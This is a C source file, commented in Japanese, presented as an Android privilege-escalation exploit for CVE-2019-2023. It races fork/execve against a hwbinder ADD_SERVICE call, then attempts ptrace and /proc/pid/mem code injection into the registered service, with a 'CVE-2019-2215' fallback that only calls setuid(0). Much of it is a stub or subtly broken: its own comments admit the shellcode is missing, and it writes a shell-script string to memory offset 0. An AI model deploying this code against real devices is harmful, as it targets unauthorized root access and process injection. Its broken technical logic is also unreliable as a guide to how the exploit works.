#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include "binder.h"

// ============================================================
// グローバル設定
// ============================================================
#define SERVICE_NAME "vendor.cve.poc"
#define OUTPUT_FILE  "/data/local/tmp/cve_2019_2023_result.txt"
#define SHELL_PATH   "/system/bin/sh"

static volatile int race_ready = 0;
static int g_service_handle = -1;
static pid_t g_service_pid = -1;

// ============================================================
// ユーティリティ
// ============================================================
static void dump_hex(const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x ", data[i]);
        if ((i+1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

// ============================================================
// CVE-2019-2023 エクスプロイト (レースコンディション)
// ============================================================
static int exploit_cve_2019_2023(void) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(SERVICE_NAME) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: preparing race condition...\n");

    // 子プロセスをフォーク（PID を維持）
    child = fork();
    if (child == 0) {
        // 子：親が ADD_SERVICE を送信する直前に execve でコンテキスト変更
        while (!race_ready) usleep(100);
        // ここで /system/bin/sh に exec して SELinux コンテキストを shell に変更
        char *argv[] = { SHELL_PATH, NULL };
        char *envp[] = { "PATH=/system/bin", NULL };
        execve(SHELL_PATH, argv, envp);
        perror("  execve in child");
        exit(1);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    // 親：子が execve を完了するまで少し待つ
    usleep(300000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, SERVICE_NAME, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);  // レースのタイミング

    printf("[*] Sending ADD_SERVICE...\n");
    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [-] ADD_SERVICE denied (patch may be present)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    // 子を終了
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, SERVICE_NAME, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// サービスプロセスの PID を取得（ps をパース）
// ============================================================
static pid_t get_service_pid(const char *service_name) {
    FILE *fp = popen("ps -A -o pid,cmd", "r");
    if (!fp) return -1;
    char line[256];
    pid_t pid = -1;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, service_name)) {
            sscanf(line, "%d", &pid);
            break;
        }
    }
    pclose(fp);
    return pid;
}

// ============================================================
// コードインジェクション (ptrace + シェルコード)
// ============================================================
static int inject_shellcode_ptrace(pid_t pid) {
    printf("[*] Attempting ptrace injection into PID %d...\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        perror("  ptrace ATTACH");
        return -1;
    }
    // 子プロセスが停止するのを待つ
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, 0, 0);
        return -1;
    }

    // ARM64 シェルコード: execve("/system/bin/sh", ["sh"], NULL)
    // このコードはアーキテクチャに依存。ここではダミーとして単に exit するコードを注入。
    // 実際には適切なシェルコードを生成する必要がある。
    // 簡易的に、/proc/pid/mem に書き込む方法を使う方が現実的。
    printf("  [!] ptrace injection not fully implemented (arch-dependent).\n");
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return -1;
}

// ============================================================
// /proc/pid/mem への書き込み (要 ptrace または同じ uid)
// ============================================================
static int inject_via_proc_mem(pid_t pid) {
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    // プロセスを停止させる
    if (kill(pid, SIGSTOP) < 0) {
        perror("  kill SIGSTOP");
        return -1;
    }
    usleep(100000);

    int fd = open(mem_path, O_RDWR);
    if (fd < 0) {
        perror("  open /proc/pid/mem");
        kill(pid, SIGCONT);
        return -1;
    }

    // シェルコードを書き込む（ここでは単に "id\n" を /dev/null にリダイレクトするだけの簡易例）
    // 実際には execve のシェルコードが必要。
    // ここではファイルにフラグを書き込むだけのデモ
    char buf[] = "#!/system/bin/sh\necho 'Injected!' > /data/local/tmp/injected.txt\n";
    size_t len = strlen(buf);
    // 適切なアドレスを決定する必要がある（通常はスタックやヒープ）
    // ここでは単に先頭に書き込む（危険）
    off_t offset = 0;
    if (lseek(fd, offset, SEEK_SET) < 0) {
        perror("  lseek");
        close(fd);
        kill(pid, SIGCONT);
        return -1;
    }
    ssize_t n = write(fd, buf, len);
    close(fd);
    kill(pid, SIGCONT);
    if (n == (ssize_t)len) {
        printf("  [+] Wrote %zu bytes to /proc/%d/mem\n", len, pid);
        return 0;
    } else {
        perror("  write");
        return -1;
    }
}

// ============================================================
// サービスの起動を待ち、PID を取得し、注入を試みる
// ============================================================
static int elevate_via_service(void) {
    printf("[*] Waiting for service to start...\n");
    int attempts = 20;
    while (attempts-- > 0) {
        g_service_pid = get_service_pid(SERVICE_NAME);
        if (g_service_pid > 0) {
            printf("  [+] Service PID: %d\n", g_service_pid);
            break;
        }
        usleep(500000);
    }
    if (g_service_pid <= 0) {
        printf("  [-] Could not find service process\n");
        return -1;
    }

    // 手法1: ptrace injection
    if (inject_shellcode_ptrace(g_service_pid) == 0) {
        printf("  [+] ptrace injection succeeded!\n");
        return 0;
    }

    // 手法2: /proc/pid/mem 書き込み
    if (inject_via_proc_mem(g_service_pid) == 0) {
        printf("  [+] /proc/pid/mem injection succeeded!\n");
        return 0;
    }

    // 手法3: シグナルを使ってコード実行（SIGSEGV ハンドラを仕込むなど）
    // ここでは簡易的にシェルを起動するための環境変数を設定（実際にはできない）
    printf("  [!] All injection methods failed.\n");
    return -1;
}

// ============================================================
// フォールバック: 他の CVE（2019-2215 など）を呼び出す
// ============================================================
static int fallback_other_cves(void) {
    printf("[*] Fallback: trying kernel exploit (CVE-2019-2215) ...\n");
    // ここに CVE-2019-2215 の完全な実装を挿入（既存コードから流用）
    // 簡易版: setuid(0) を試す
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) worked!\n");
        system("id > " OUTPUT_FILE);
        return 0;
    }
    return -1;
}

// ============================================================
// メイン
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Advanced Exploit with Service Injection\n");
    printf("============================================================\n\n");

    // 1. CVE-2019-2023 でサービス登録
    if (exploit_cve_2019_2023() < 0) {
        printf("[-] CVE-2019-2023 failed, trying fallback...\n");
        goto fallback;
    }

    // 2. サービスを利用して特権昇格を試みる
    if (elevate_via_service() == 0) {
        printf("[+] Privilege escalation via service injection successful!\n");
        // 注入が成功すれば、シェルが起動されているはず
        system("cat " OUTPUT_FILE);
        return 0;
    }

    // 3. フォールバック
fallback:
    printf("\n[*] Trying fallback exploits...\n");
    if (fallback_other_cves() == 0) {
        printf("[+] Fallback exploit succeeded!\n");
        system("cat " OUTPUT_FILE);
        return 0;
    }

    printf("[-] All exploits failed. Final uid=%d\n", getuid());
    return 1;
}
